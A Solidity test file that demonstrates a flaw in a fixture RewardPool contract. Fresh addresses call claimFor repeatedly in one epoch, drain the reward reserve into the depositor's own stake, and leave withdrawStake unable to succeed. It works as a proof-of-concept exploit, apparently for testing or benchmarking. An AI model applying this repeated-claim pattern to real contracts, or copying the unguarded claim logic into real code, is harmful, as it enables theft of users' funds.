// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "fixture/RewardPool.sol";

interface VmReward {
    function deal(address, uint256) external;
    function prank(address) external;
}

contract RewardPoolRiskTest {
    VmReward private constant vm = VmReward(address(uint160(uint256(keccak256("hevm cheat code")))));
    address private constant reserveFunder = address(0xBEEF);

    receive() external payable {}

    function test_FreshCallersExhaustReservesAndLockStake() public {
        RewardPool pool = new RewardPool();
        vm.deal(address(this), 1 ether);
        pool.deposit{value: 1 ether}();
        vm.deal(reserveFunder, 1 ether);
        vm.prank(reserveFunder);
        pool.fundRewards{value: 1 ether}();
        pool.advanceEpoch();

        for (uint160 i = 0; i < 11; i++) {
            vm.prank(address(uint160(0xCA11) + i));
            pool.claimFor(address(this));
        }

        require(pool.rewardCredit(address(this)) == 1.1 ether, "same epoch was not claimed repeatedly");
        pool.withdrawRewards();
        require(address(pool).balance == 0.9 ether, "depositor stake not consumed");
        (bool ok,) = address(pool).call(abi.encodeWithSignature("withdrawStake()"));
        require(!ok, "depositor was able to withdraw full stake");
        require(pool.shares(address(this)) == 1, "failed withdrawal lost share accounting");
    }
}
